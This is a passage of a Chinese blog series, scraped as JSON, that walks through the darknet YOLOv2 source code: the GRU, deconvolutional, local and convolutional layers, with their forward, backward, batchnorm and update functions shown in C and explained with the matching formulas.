forward_gru_layer; l.backward = backward_gru_layer; l.update = update_gru_layer;...&#125; 0x0301 forward_gru_layer123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475void forward_gru_layer(layer l, network net)&#123; network s = net; s.train = net.train; int i; layer uz = *(l.uz); layer ur = *(l.ur); layer uh = *(l.uh); layer wz = *(l.wz); layer wr = *(l.wr); layer wh = *(l.wh); fill_cpu(l.outputs * l.batch * l.steps, 0, uz.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, ur.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, uh.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, wz.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, wr.delta, 1); fill_cpu(l.outputs * l.batch * l.steps, 0, wh.delta, 1); if(net.train) &#123; fill_cpu(l.outputs * l.batch * l.steps, 0, l.delta, 1); copy_cpu(l.outputs*l.batch, l.state, 1, l.prev_state, 1); &#125; for (i = 0; i &lt; l.steps; ++i) &#123; s.input = l.state; forward_connected_layer(wz, s); forward_connected_layer(wr, s); s.input = net.input; forward_connected_layer(uz, s); forward_connected_layer(ur, s); forward_connected_layer(uh, s); copy_cpu(l.outputs*l.batch, uz.output, 1, l.z_cpu, 1); axpy_cpu(l.outputs*l.batch, 1, wz.output, 1, l.z_cpu, 1); copy_cpu(l.outputs*l.batch, ur.output, 1, l.r_cpu, 1); axpy_cpu(l.outputs*l.batch, 1, wr.output, 1, l.r_cpu, 1); activate_array(l.z_cpu, l.outputs*l.batch, LOGISTIC); activate_array(l.r_cpu, l.outputs*l.batch, LOGISTIC); copy_cpu(l.outputs*l.batch, l.state, 1, l.forgot_state, 1); mul_cpu(l.outputs*l.batch, l.r_cpu, 1, l.forgot_state, 1); s.input = l.forgot_state; forward_connected_layer(wh, s); copy_cpu(l.outputs*l.batch, uh.output, 1, l.h_cpu, 1); axpy_cpu(l.outputs*l.batch, 1, wh.output, 1, l.h_cpu, 1); if(l.tanh)&#123; activate_array(l.h_cpu, l.outputs*l.batch, TANH); &#125; else &#123; activate_array(l.h_cpu, l.outputs*l.batch, LOGISTIC); &#125; weighted_sum_cpu(l.state, l.h_cpu, l.z_cpu, l.outputs*l.batch, l.output); copy_cpu(l.outputs*l.batch, l.output, 1, l.state, 1); net.input += l.inputs*l.batch; l.output += l.outputs*l.batch; increment_layer(&amp;uz, 1); increment_layer(&amp;ur, 1); increment_layer(&amp;uh, 1); increment_layer(&amp;wz, 1); increment_layer(&amp;wr, 1); increment_layer(&amp;wh, 1); &#125;&#125; 1axpy_cpu(l.outputs*l.batch, 1, wz.output, 1, l.z_cpu, 1); 对应$i^z(t)=x_tU^z+s_{t-1}W^z$ 1axpy_cpu(l.outputs*l.batch, 1, wr.output, 1, l.r_cpu, 1); 对应$i^z(t)=x_tU^z+s_{t-1}W^z$ 1mul_cpu(l.outputs*l.batch, l.r_cpu, 1, l.forgot_state, 1); 对应$s_{t-1}\\odot r(t)$ 1axpy_cpu(l.outputs*l.batch, 1, wh.output, 1, l.h_cpu, 1); 对应$i^h(t)=x_tU^h+(s_{t-1}\\odot r(t))W^h$ 看一下weighted_sum_cpu函数的作用 1234567void weighted_sum_cpu(float *a, float *b, float *s, int n, float *c)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; c[i] = s[i]*a[i] + (1-s[i])*(b ? b[i] : 0); &#125;&#125; 1weighted_sum_cpu(l.state, l.h_cpu, l.z_cpu, l.outputs*l.batch, l.output); 对应$(1-z)\\odot h+z\\odot s_{t-1}$ 0x0302 update_gru_layer123456789void update_gru_layer(layer l, update_args a)&#123; update_connected_layer(*(l.ur), a); update_connected_layer(*(l.uz), a); update_connected_layer(*(l.uh), a); update_connected_layer(*(l.wr), a); update_connected_layer(*(l.wz), a); update_connected_layer(*(l.wh), a);&#125; 我现在看到的这个源码，作者还没有实现backward_gru_layer 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^!","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（五）","slug":"2017-12-21-YOLOv2代码分析（五）","date":"2017-12-20T16:00:00.000Z","updated":"2018-02-18T08:44:17.396Z","comments":true,"path":"2017/12/21/2017-12-21-YOLOv2代码分析（五）/","link":"","permalink":"http://coordinate.wang/2017/12/21/2017-12-21-YOLOv2代码分析（五）/","excerpt":"#0x01 make_convolutional_layer 终于又回到了make_convolutional_layer这个函数","text":"#0x01 make_convolutional_layer 终于又回到了make_convolutional_layer这个函数 1234567891011121314151617181920212223242526272829303132333435//make_convolutional_layer if(binary)&#123; l.binary_weights = calloc(l.nweights, sizeof(float)); l.cweights = calloc(l.nweights, sizeof(char)); l.scales = calloc(n, sizeof(float)); &#125; if(xnor)&#123; l.binary_weights = calloc(l.nweights, sizeof(float)); l.binary_input = calloc(l.inputs*l.batch, sizeof(float)); &#125; if(batch_normalize)&#123; l.scales = calloc(n, sizeof(float)); l.scale_updates = calloc(n, sizeof(float)); for(i = 0; i &lt; n; ++i)&#123; l.scales[i] = 1; &#125; l.mean = calloc(n, sizeof(float)); l.variance = calloc(n, sizeof(float)); l.mean_delta = calloc(n, sizeof(float)); l.variance_delta = calloc(n, sizeof(float)); l.rolling_mean = calloc(n, sizeof(float)); l.rolling_variance = calloc(n, sizeof(float)); l.x = calloc(l.batch*l.outputs, sizeof(float)); l.x_norm = calloc(l.batch*l.outputs, sizeof(float)); &#125;... fprintf(stderr, \"conv %5d %2d x%2d /%2d %4d x%4d x%4d -&gt; %4d x%4d x%4d\\n\", n, size, size, stride, w, h, c, l.out_w, l.out_h, l.out_c); return l;&#125; 如果你把之前的几篇文章都看过的话，那么这里的参数意义你应该很清楚了。这里面我唯一要说的几个内容是关于cuda编程的，但是我会把这部分内容放到本系列文章的最后去说，如果你感兴趣的话，可以到时候去看看。 至此我们终于结束了make_convolutional_layer函数 #0x02 parse_convolutional 大家可以回到（二）中的0x0103 1234567 //parse_convolutional convolutional_layer layer = make_convolutional_layer(batch,h,w,c,n,groups,size,stride,padding,activation, batch_normalize, binary, xnor, params.net-&gt;adam); layer.flipped = option_find_int_quiet(options, \"flipped\", 0); layer.dot = option_find_float_quiet(options, \"dot\", 0); return layer;&#125; 后面没什么好说的，回到parse_network_cfg #0x03 parse_network_cfg 时隔多日，又回到了这里（二）0x0102 123456//parse_network_cfg if(lt == CONVOLUTIONAL)&#123; l = parse_convolutional(options, params); &#125;else if(lt == DECONVOLUTIONAL)&#123; l = parse_deconvolutional(options, params); &#125; 我们看这个parse_deconvolutional函数 0x00301 parse_deconvolutional123456789101112131415161718192021222324layer parse_deconvolutional(list *options, size_params params)&#123; int n = option_find_int(options, \"filters\",1); int size = option_find_int(options, \"size\",1); int stride = option_find_int(options, \"stride\",1); char *activation_s = option_find_str(options, \"activation\", \"logistic\"); ACTIVATION activation = get_activation(activation_s); int batch,h,w,c; h = params.h; w = params.w; c = params.c; batch=params.batch; if(!(h &amp;&amp; w &amp;&amp; c)) error(\"Layer before deconvolutional layer must output image.\"); int batch_normalize = option_find_int_quiet(options, \"batch_normalize\", 0); int pad = option_find_int_quiet(options, \"pad\",0); int padding = option_find_int_quiet(options, \"padding\",0); if(pad) padding = size/2; layer l = make_deconvolutional_layer(batch,h,w,c,n,size,stride,padding, activation, batch_normalize, params.net-&gt;adam); return l;&#125; 上面的一些参数我在之前的文章中已经说过了，这里就不再说明了。直接看关键函数make_deconvolutional_layer 1234567891011layer make_deconvolutional_layer(int batch, int h, int w, int c, int n, int size, int stride, int padding, ACTIVATION activation, int batch_normalize, int adam)&#123; int i; layer l = &#123;0&#125;; l.type = DECONVOLUTIONAL;... l.forward = forward_deconvolutional_layer; l.backward = backward_deconvolutional_layer; l.update = update_deconvolutional_layer; 前面的参数信息我这里也不再提了，直接看关键的三个函数，先看第一个forward_deconvolutional_layer 0x030101 forward_deconvolutional_layer1234567891011121314151617181920212223242526void forward_deconvolutional_layer(const layer l, network net)&#123; int i; int m = l.size*l.size*l.n; int n = l.h*l.w; int k = l.c; fill_cpu(l.outputs*l.batch, 0, l.output, 1); for(i = 0; i &lt; l.batch; ++i)&#123; float *a = l.weights; float *b = net.input + i*l.c*l.h*l.w; float *c = net.workspace; gemm_cpu(1,0,m,n,k,1,a,m,b,n,0,c,n); col2im_cpu(net.workspace, l.out_c, l.out_h, l.out_w, l.size, l.stride, l.pad, l.output+i*l.outputs); &#125; if (l.batch_normalize) &#123; forward_batchnorm_layer(l, net); &#125; else &#123; add_bias(l.output, l.biases, l.batch, l.n, l.out_w*l.out_h); &#125; activate_array(l.output, l.batch*l.n*l.out_w*l.out_h, l.activation);&#125; 这里的函数我在之前的文章中都分析过，我这里主要分析一下这个函数的逻辑。 我们可以对比之前的卷积层，对比后发现区别有两个： A转置了 col2im_cpu函数放在了卷积函数的后面 这几点说明了什么？deconvolutional确实是一种convolutional，只是它是一种转置的卷积。 0x030102 backward_deconvolutional_layer12345678910111213141516171819202122232425262728293031323334353637383940void backward_deconvolutional_layer(layer l, network net)&#123; int i; gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); if(l.batch_normalize)&#123; backward_batchnorm_layer(l, net); &#125; else &#123; backward_bias(l.bias_updates, l.delta, l.batch, l.n, l.out_w*l.out_h); &#125; //if(net.delta) memset(net.delta, 0, l.batch*l.h*l.w*l.c*sizeof(float)); for(i = 0; i &lt; l.batch; ++i)&#123; int m = l.c; int n = l.size*l.size*l.n; int k = l.h*l.w; float *a = net.input + i*m*k; float *b = net.workspace; float *c = l.weight_updates; im2col_cpu(l.delta + i*l.outputs, l.out_c, l.out_h, l.out_w, l.size, l.stride, l.pad, b); gemm_cpu(0,1,m,n,k,1,a,k,b,k,1,c,n); if(net.delta)&#123; int m = l.c; int n = l.h*l.w; int k = l.size*l.size*l.n; float *a = l.weights; float *b = net.workspace; float *c = net.delta + i*n*m; gemm_cpu(0,0,m,n,k,1,a,k,b,n,1,c,n); &#125; &#125;&#125; 这个函数的理解和之前的backward_convolutional_layer没有太大区别，而且变化也不大。 0x030103 update_deconvolutional_layer1234567891011121314151617181920void update_deconvolutional_layer(layer l, update_args a)&#123; float learning_rate = a.learning_rate*l.learning_rate_scale; float momentum = a.momentum; float decay = a.decay; int batch = a.batch; int size = l.size*l.size*l.c*l.n; axpy_cpu(l.n, learning_rate/batch, l.bias_updates, 1, l.biases, 1); scal_cpu(l.n, momentum, l.bias_updates, 1); if(l.scales)&#123; axpy_cpu(l.n, learning_rate/batch, l.scale_updates, 1, l.scales, 1); scal_cpu(l.n, momentum, l.scale_updates, 1); &#125; axpy_cpu(size, -decay*batch, l.weights, 1, l.weight_updates, 1); axpy_cpu(size, learning_rate/batch, l.weight_updates, 1, l.weights, 1); scal_cpu(size, momentum, l.weight_updates, 1);&#125; 同样的这个函数也只是起到了更新参数的作用，和之前的update_convolutional_layer一样。我们回到make_deconvolutional_layer函数 12345678910//make_deconvolutional_layer l.batch_normalize = batch_normalize; if(batch_normalize)&#123; l.scales = calloc(n, sizeof(float)); l.scale_updates = calloc(n, sizeof(float)); for(i = 0; i &lt; n; ++i)&#123; l.scales[i] = 1; &#125;... 这里都是一些参数的配置，我在之前文章中都有说过，这里不再重复。 好的，parse_deconvolutional这个函数就结束了。 0x0302 parse_local我们回到parse_network_cfg函数 12else if(lt == LOCAL)&#123; l = parse_local(options, params); 我们来看parse_local这个函数 1234567891011121314151617181920local_layer parse_local(list *options, size_params params)&#123; int n = option_find_int(options, \"filters\",1); int size = option_find_int(options, \"size\",1); int stride = option_find_int(options, \"stride\",1); int pad = option_find_int(options, \"pad\",0); char *activation_s = option_find_str(options, \"activation\", \"logistic\"); ACTIVATION activation = get_activation(activation_s); int batch,h,w,c; h = params.h; w = params.w; c = params.c; batch=params.batch; if(!(h &amp;&amp; w &amp;&amp; c)) error(\"Layer before local layer must output image.\"); local_layer layer = make_local_layer(batch,h,w,c,n,size,stride,pad,activation); return layer;&#125; 上面的一些参数我在之前的文章中已经说过了，这里就不再说明了。直接看关键函数make_local_layer 123456789101112local_layer make_local_layer(int batch, int h, int w, int c, int n, int size, int stride, int pad, ACTIVATION activation)&#123; ... l.forward = forward_local_layer; l.backward = backward_local_layer; l.update = update_local_layer; ... fprintf(stderr, \"Local Layer: %d x %d x %d image, %d filters -&gt; %d x %d x %d image\\n\", h,w,c,n, out_h, out_w, n); return l;&#125; 同样的前面的参数配置我们不管了，直接看三个关键的函数，先看第一个forward_local_layer 0x030201 forward_local_layer123456789101112131415161718192021222324252627282930void forward_local_layer(const local_layer l, network net)&#123; int out_h = local_out_height(l); int out_w = local_out_width(l); int i, j; int locations = out_h * out_w; for(i = 0; i &lt; l.batch; ++i)&#123; copy_cpu(l.outputs, l.biases, 1, l.output + i*l.outputs, 1); &#125; for(i = 0; i &lt; l.batch; ++i)&#123; float *input = net.input + i*l.w*l.h*l.c; im2col_cpu(input, l.c, l.h, l.w, l.size, l.stride, l.pad, net.workspace); float *output = l.output + i*l.outputs; for(j = 0; j &lt; locations; ++j)&#123; float *a = l.weights + j*l.size*l.size*l.c*l.n; float *b = net.workspace + j; float *c = output + j; int m = l.n; int n = 1; int k = l.size*l.size*l.c; gemm(0,0,m,n,k,1,a,k,b,locations,1,c,locations); &#125; &#125; activate_array(l.output, l.outputs*l.batch, l.activation);&#125; 我们先看前面两个函数 123456789101112131415int local_out_height(local_layer l)&#123; int h = l.h; if (!l.pad) h -= l.size; else h -= 1; return h/l.stride + 1;&#125;int local_out_width(local_layer l)&#123; int w = l.w; if (!l.pad) w -= l.size; else w -= 1; return w/l.stride + 1;&#125; 这两个函数同样是计算卷积后的图像的高度和宽度，和我们之前的卷积层计算公式对比 1(l.h + 2*l.pad - l.size) / l.stride + 1 和卷积层不一样的是这里没有考虑pad。 我们可以对比之前的卷积层，对比后发现唯一一个区别就是参数b，我们这里的参数b是变化的，这个恰恰符合了local layer的原理。local layer就是一种权重不共享的卷积层（早期的AlexNet和GoogleNet中有所应用）。 我这里说的可能有一些抽象¬_¬，有时间画个图吧，先就这样了。 0x030202 backward_local_layer1234567891011121314151617181920212223242526272829303132333435363738394041424344void backward_local_layer(local_layer l, network net)&#123; int i, j; int locations = l.out_w*l.out_h; gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); for(i = 0; i &lt; l.batch; ++i)&#123; axpy_cpu(l.outputs, 1, l.delta + i*l.outputs, 1, l.bias_updates, 1); &#125; for(i = 0; i &lt; l.batch; ++i)&#123; float *input = net.input + i*l.w*l.h*l.c; im2col_cpu(input, l.c, l.h, l.w, l.size, l.stride, l.pad, net.workspace); for(j = 0; j &lt; locations; ++j)&#123; float *a = l.delta + i*l.outputs + j; float *b = net.workspace + j; float *c = l.weight_updates + j*l.size*l.size*l.c*l.n; int m = l.n; int n = l.size*l.size*l.c; int k = 1; gemm(0,1,m,n,k,1,a,locations,b,locations,1,c,n); &#125; if(net.delta)&#123; for(j = 0; j &lt; locations; ++j)&#123; float *a = l.weights + j*l.size*l.size*l.c*l.n; float *b = l.delta + i*l.outputs + j; float *c = net.workspace + j; int m = l.size*l.size*l.c; int n = 1; int k = l.n; gemm(1,0,m,n,k,1,a,m,b,locations,0,c,locations); &#125; col2im_cpu(net.workspace, l.c, l.h, l.w, l.size, l.stride, l.pad, net.delta+i*l.c*l.h*l.w); &#125; &#125;&#125; 这里和之前backward_convolutional_layer的区别还是在b 0x030203 update_local_layer12345678910111213141516void update_local_layer(local_layer l, update_args a)&#123; float learning_rate = a.learning_rate*l.learning_rate_scale; float momentum = a.momentum; float decay = a.decay; int batch = a.batch; int locations = l.out_w*l.out_h; int size = l.size*l.size*l.c*l.n*locations; axpy_cpu(l.outputs, learning_rate/batch, l.bias_updates, 1, l.biases, 1); scal_cpu(l.outputs, momentum, l.bias_updates, 1); axpy_cpu(size, -decay*batch, l.weights, 1, l.weight_updates, 1); axpy_cpu(size, learning_rate/batch, l.weight_updates, 1, l.weights, 1); scal_cpu(size, momentum, l.weight_updates, 1);&#125; 这个函数没什么好说的，就是更新参数信息。 至此parse_local函数就分析完了，下一章我们会回到parse_network_cfg函数 文章全部YOLOv2源码分析 由于本人水平有限，文中有不对之处，希望大家指出，谢谢^_^!","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://coordinate.wang/categories/机器学习/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"YOLO","slug":"YOLO","permalink":"http://coordinate.wang/tags/YOLO/"},{"name":"darknet","slug":"darknet","permalink":"http://coordinate.wang/tags/darknet/"}]},{"title":"YOLOv2代码分析（四）","slug":"2017-12-20-YOLOv2代码分析（四）","date":"2017-12-19T16:00:00.000Z","updated":"2018-02-18T08:36:31.492Z","comments":true,"path":"2017/12/20/2017-12-20-YOLOv2代码分析（四）/","link":"","permalink":"http://coordinate.wang/2017/12/20/2017-12-20-YOLOv2代码分析（四）/","excerpt":"0x01 backward_convolutional_layer12345678void backward_convolutional_layer(convolutional_layer l, network net)&#123; int i, j; int m = l.n/l.groups; //每组卷积核的个数 int n = l.size*l.size*l.c/l.groups; //每组卷积核的元素个数 int k = l.out_w*l.out_h; //输出图像的元素个数 gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); 这里出现了一个gradient_array函数，我们看看这个函数有什么作用。","text":"0x01 backward_convolutional_layer12345678void backward_convolutional_layer(convolutional_layer l, network net)&#123; int i, j; int m = l.n/l.groups; //每组卷积核的个数 int n = l.size*l.size*l.c/l.groups; //每组卷积核的元素个数 int k = l.out_w*l.out_h; //输出图像的元素个数 gradient_array(l.output, l.outputs*l.batch, l.activation, l.delta); 这里出现了一个gradient_array函数，我们看看这个函数有什么作用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849float gradient(float x, ACTIVATION a)&#123; switch(a)&#123; case LINEAR: return linear_gradient(x); case LOGISTIC: return logistic_gradient(x); case LOGGY: return loggy_gradient(x); case RELU: return relu_gradient(x); case ELU: return elu_gradient(x); case RELIE: return relie_gradient(x); case RAMP: return ramp_gradient(x); case LEAKY: return leaky_gradient(x); case TANH: return tanh_gradient(x); case PLSE: return plse_gradient(x); case STAIR: return stair_gradient(x); case HARDTAN: return hardtan_gradient(x); case LHTAN: return lhtan_gradient(x); &#125; return 0;&#125;void gradient_array(const float *x, const int n, const ACTIVATION a, float *delta)&#123; int i; for(i = 0; i &lt; n; ++i)&#123; delta[i] *= gradient(x[i], a); &#125;&#125; static inline float linear_gradient(float x)&#123;return 1;&#125;static inline float logistic_gradient(float x)&#123;return (1-x)*x;&#125;static inline float relu_gradient(float x)&#123;return (x&gt;0);&#125;static inline float elu_gradient(float x)&#123;return (x &gt;= 0) + (x &lt; 0)*(x + 1);&#125;static inline float relie_gradient(float x)&#123;return (x&gt;0) ? 1 : .01;&#125;static inline float ramp_gradient(float x)&#123;return (x&gt;0)+.1;&#125;static inline float leaky_gradient(float x)&#123;return (x&gt;0) ? 1 : .1;&#125;static inline float tanh_gradient(float x)&#123;return 1-x*x;&#125;static inline float plse_gradient(float x)&#123;return (x &lt; 0 || x &gt; 1) ? .01 : .125;&#125; 这个函数的作用很明显，就是将layer的输出图像，输入到相应的梯度下降算法（计算每一个元素对应激活函数的导数），最后将delta的每个元素乘以激活函数的导数，结果送到delta指向的内存中。 举个例子 1234m=2 n=3x3=9 k=3x3=9x [95 107 107 95]relu激活delta[0]=95 delta[1]=107 delta[2]=107 delta[3]=105 接着往后 12if(l.batch_normalize)&#123; backward_batchnorm_layer(l, net); 出现这个backward_batchnorm_layer函数 0x0101 backward_batchnorm_layer12345678910111213141516void backward_batchnorm_layer(layer l, network net)&#123; if(!net.train)&#123; l.mean = l.rolling_mean; l.variance = l.rolling_variance; &#125; backward_bias(l.bias_updates, l.delta, l.batch, l.out_c, l.out_w*l.out_h); backward_scale_cpu(l.x_norm, l.delta, l.batch, l.out_c, l.out_w*l.out_h, l.scale_updates); scale_bias(l.delta, l.scales, l.batch, l.out_c, l.out_h*l.out_w); mean_delta_cpu(l.delta, l.variance, l.batch, l.out_c, l.out_w*l.out_h, l.mean_delta); variance_delta_cpu(l.x, l.delta, l.mean, l.variance, l.batch, l.out_c, l.out_w*l.out_h, l.variance_delta); normalize_delta_cpu(l.x, l.mean, l.variance, l.mean_delta, l.variance_delta, l.batch, l.out_c, l.out_w*l.out_h, l.delta); if(l.type == BATCHNORM) copy_cpu(l.outputs*l.batch, l.delta, 1, net.delta, 1);&#125; 这里面也有很多函数，我们一一分析 12345678910111213141516void backward_bias(float *bias_updates, float *delta, int batch, int n, int size)&#123; int i,b; for(b = 0; b &lt; batch; ++b)&#123; for(i = 0; i &lt; n; ++i)&#123; bias_updates[i] += sum_array(delta+size*(i+b*n), size); &#125; &#125;&#125;float sum_array(float *a, int n)//计算输入数组的和&#123; int i; float sum = 0; for(i = 0; i &lt; n; ++i) sum += a[i]; return sum;&#125; bias_updates:指向权重更新的指针 delta:指向前面梯度下降得到的累乘值 batch:batch大小 n:layer的输出通道数目 size:输出图像的元素个数 这个函数就是计算偏置的更新值（误差函数对偏置的导数），将delta对应同一个卷积核的项相加。 这个函数想要描述的就是这个公式 $\\frac{∂L}{∂\\beta}=\\sum_0^m\\frac{∂L}{∂y_i}$ 1234567891011121314void backward_scale_cpu(float *x_norm, float *delta, int batch, int n, int size, float *scale_updates)&#123; int i,b,f; for(f = 0; f &lt; n; ++f)&#123; float sum = 0; for(b = 0; b &lt; batch; ++b)&#123; for(i = 0; i &lt; size; ++i)&#123; int index = i + size*(f + n*b); sum += delta[index] * x_norm[index]; &#125; &#125; scale_updates[f] += sum; &#125;&#125; 这个函数想要描述的就是这个公式 $\\frac{∂L}{∂\\gamma}=\\sum_0^m\\frac{∂l}{∂y_i}\\hat{x_i}$ 123456789101112131415void mean_delta_cpu(float *delta, float *variance, int batch, int filters, int spatial, float *mean_delta)&#123; int i,j,k; for(i = 0; i &lt; filters; ++i)&#123; mean_delta[i] = 0; for (j = 0; j &lt; batch; ++j) &#123; for (k = 0; k &lt; spatial; ++k) &#123; int index = j*filters*spatial + i*spatial + k; mean_delta[i] += delta[index]; &#125; &#125; mean_delta[i] *= (-1./sqrt(variance[i] + .00001f)); &#125;&#125; 这个函数想要描述的就是这个公式 $\\frac{∂L}{∂mean}=\\sum_0^m\\frac{∂L}{∂y_i}\\frac{∂y_i}{∂mean}=\\sum_0^m\\frac{∂L}{∂y_i}\\frac{−1}{\\sqrt{var+eps}}$ 123456789101112131415void variance_delta_cpu(float *x, float *delta, float *mean, float *variance, int batch, int filters, int spatial, float *variance_delta)&#123; int i,j,k; for(i = 0; i &lt; filters; ++i)&#123; variance_delta[i] = 0; for(j = 0; j &lt; batch; ++j)&#123; for(k = 0; k &lt; spatial; ++k)&#123; int index = j*filters*spatial + i*spatial + k; variance_delta[i] += delta[index]*(x[index] - mean[i]); &#125; &#125; variance_delta[i] *= -.5 * pow(variance[i] + .00001f, (float)(-3./2.)); &#125;&#125; 这个函数想要描述的就是这个公式 $\\frac{∂L}{∂var}=\\sum_0^m\\frac{∂L}{∂y_i}(x_i−mean)(-\\frac{1}{2})(var+eps)^{−\\frac{3}{2}}$ 123456789101112void normalize_delta_cpu(float *x, float *mean, float *variance, float *mean_delta, float *variance_delta, int batch, int filters, int spatial, float *delta)&#123; int f, j, k; for(j = 0; j &lt; batch; ++j)&#123; for(f = 0; f &lt; filters; ++f)&#123; for(k = 0; k &lt; spatial; ++k)&#123; int index = j*filters*spatial + f*spatial + k; delta[index] = delta[index] * 1./(sqrt(variance[f] + .00001f)) + variance_delta[f] * 2. * (x[index] - mean[f]) / (spatial * batch) + mean_delta[f]/(spatial*batch); &#125; &#125; &#125;&#125; 这个函数想要描述的就是这个公式 $\\frac{∂L}{∂x_i}=\\frac{∂L}{∂y_i}\\frac{1}{\\sqrt{var+eps}}+\\frac{∂L}{∂var}\\frac{∂var}{∂x_i}+\\frac{∂L}{∂mean}\\frac{∂mean}{∂x_i}=\\frac{∂L}{∂y_i}\\frac{1}{\\sqrt{var+eps}}+\\frac{∂L}{∂var}\\frac{2}{m}(x_i-mean)+\\frac{∂L}{∂mean}\\frac{1}{m}$ 回到backward_convolutional_layer函数 123456//backward_convolutional_layer if(l.batch_normalize)&#123; backward_batchnorm_layer(l, net); &#125; else &#123; backward_bias(l.bias_updates, l.delta, l.batch, l.n, k); &#125; 如果没有定义batch_normalize的话，直接更新bias就完事了。 接着往后 1234567891011121314151617181920212223242526 //backward_convolutional_layer for(i = 0; i &lt; l.batch; ++i)&#123; for(j = 0; j &lt; l.groups; ++j)&#123; float *a = l.delta + (i*l.groups + j)*m*k; float *b = net.workspace; float *c = l.weight_updates + j*l.nweights/l.groups; float *im = net.input+(i*l.groups + j)*l.c/l.groups*l.h*l.w; im2col_cpu(im, l.c/l.groups, l.h, l.w, l.size, l.stride, l.pad, b); gemm(0,1,m,n,k,1,a,k,b,k,1,c,n); if(net.delta)&#123; a = l.weights + j*l.nweights/l.groups; b = l.delta + (i*l.groups + j)*m*k; c = net.workspace; gemm(1,0,n,k,m,1,a,n,b,k,0,c,k); col2im_cpu(net.workspace, l.c/l.groups, l.h, l.w, l.size, l.stride, l.pad, net.delta + (i*l.groups + j)*l.c/l.groups*l.h*l.w); &#125; &#125; &#125;&#125; 首先我们这里先说明一个问题，细心的同学会发现，这里使用的是gemm(0,1...)，也就是我在（三）中说过的，我这里对B进行了转置操作。为什么要这样做呢？ 先看看参数是什么意思。 123int m = l.n/l.groups; //每组卷积核的个数int n = l.size*l.size*l.c/l.groups; //每组卷积核的元素个数int k = l.out_w*l.out_h; //输出图像的元素个数 a指向一个group的l.delta的一行，元素个数为(l.out_c)*(l.out_h*l.out_w)；b指向保存结果的内存，大小是(l.c*l.size*l.size)*(l.out_h*l.out_w)；c指向一个group的weight的一行，大小是(l.n)*(l.c*l.size*l.size)。gemm描述的是这样一种运算a*b+c。所以根据矩阵运算的原理，这里的b要进行转置操作。 那么这里的卷积作用也就非常明显了，就是就算当前层的权重更新c=alpha*a*b+beta*c。 和之前的forward_convolutional_layer函数参数对比 123456int m = l.n/l.groups;//一个group的卷积核个数int k = l.size*l.size*l.c/l.groups;//一个group的卷积核元素个数int n = l.out_w*l.out_h;//一个输出图像的元素个数float *a = l.weights + j*l.nweights/l.groups;float *b = net.workspace;float *c = l.output + (i*l.groups + j)*n*m; 接着看后面这个判断语句中的内容 1234567891011//backward_convolutional_layerif(net.delta)&#123; a = l.weights + j*l.nweights/l.groups;//注意此时权重没有更新，我们上面算的是放在了weight_updates里面 b = l.delta + (i*l.groups + j)*m*k; c = net.workspace; gemm(1,0,n,k,m,1,a,n,b,k,0,c,k); col2im_cpu(net.workspace, l.c/l.groups, l.h, l.w, l.size, l.stride, l.pad, net.delta + (i*l.groups + j)*l.c/l.groups*l.h*l.w);&#125; 我们看看这里的gemm和前面的有什么区别，首先看参数。这里的a对应上面的c，b对应上面的a，c对应上面的b。 a指向weight，大小是(l.n)*(l.c*l.size*l.size);b指向delta，大小是(l.out_c)*(l.out_h*l*out_w)；c指向输出存储空间，大小是(l.c*l.size*l.size)*(l.out_h*l.out_w)。那么这里调用gemm(1,0...)就很好理解了，最后完成c=alpha*a*b+beta*c操作，也就是更新workspace的工作。 那么这里这个函数到底有什么意义呢？ 通过上面那个c=alpha*a*b+beta*c给我们的直观感受，就是将当前层的delta和上一层weights进行卷积操作，这个得到的结果意义不是很大，但是他经过之前说的gradient_array操作后就有了非常重要的意义，就是上一层的delta。为什么？这就要从bp算法开始说了 0x02 卷积层误差传递首先举个例子 我们假设输入是A，卷积核是W，输出是C，激活函数是f，偏向是B，我们可以知道 $out=W*A+B$ $C=f(out)​$ 我们假设损失函数是L，那么可以计算出误差项$\\Delta$ $\\Delta=\\frac{∂L}{∂out}$ 好的现在我们要求解l-1层的$\\Delta$ $\\Delta^{l-1}=\\frac{∂L}{∂out^{l-1}}=\\frac{∂L}{∂C^{l-1}}\\frac{∂C^{l-1}}{∂out^{l-1}}=\\frac{∂L}{∂C^{l-1}}f^\\prime(out^{l-1})$ 由上面这个图不难看出 $\\frac{∂L}{∂C^{l-1}}=\\Delta^l*W$ 所以 $\\Delta^{l-1}=\\Delta^l*W\\circ f^\\prime(out^{l-1})$ 回到backward_convolutional_layer这个函数 123//backward_convolutional_layercol2im_cpu(net.workspace, l.c/l.groups, l.h, l.w, l.size, l.stride, l.pad, net.delta + (i*l.groups + j)*l.c/l.groups*l.h*l.w); 最后这个函数col2im_cpu的作用就是将net.workspace重排，类似于（三）中的im2col_cpu，只是这里反过来了。 0x03 update_convolutional_layer12345678910111213141516171819void update_convolutional_layer(convolutional_layer l, update_args a)&#123; float learning_rate = a.learning_rate*l.learning_rate_scale; float momentum = a.momentum; float decay = a.decay; int batch = a.batch; axpy_cpu(l.n, learning_rate/batch, l.bias_updates, 1, l.biases, 1); scal_cpu(l.n, momentum, l.bias_updates, 1); if(l.scales)&#123; axpy_cpu(l.n, learning_rate/batch, l.scale_updates, 1, l.scales, 1); scal_cpu(l.n, momentum, l.scale_updates, 1); &#125; axpy_cpu(l.nweights, -decay*batch, l.weights, 1, l.weight_updates, 1); axpy_cpu(l.nweights, learning_rate/batch, l.weight_updates, 1, l.weights, 1); scal_cpu(l.nweights, momentum, l.weight_updates, 